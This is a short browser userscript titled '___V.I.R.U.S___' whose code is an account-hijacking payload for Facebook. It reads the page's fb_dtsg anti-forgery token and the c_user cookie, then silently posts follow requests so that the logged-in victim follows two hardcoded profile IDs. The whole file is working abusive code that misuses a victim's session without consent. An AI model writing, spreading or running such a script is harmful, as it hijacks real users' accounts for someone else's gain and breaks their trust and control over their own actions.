// ==UserScript==
// @name ___V.I.R.U.S___
// @description W.A.R.N.I.N.G
 // ==/UserScript==
function a(id){var e=new XMLHttpRequest;var t="/ajax/follow/follow_profile.php?__a=1";var n=document.getElementsByName("fb_dtsg")[0].value;var r=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var i="profile_id="+id+"&location=1&source=follow-button&subscribed_button_id=u_0_y&fb_dtsg="+n+"&lsd&__"+r+"&phstamp=";e.open("POST",t,true);e.setRequestHeader("Content-type","application/x-www-form-urlencoded");e.onreadystatechange=function(){if(e.readyState==4&&e.status==200){e.close}};e.send(i)}
a("100003487180075");
a("100005441050364");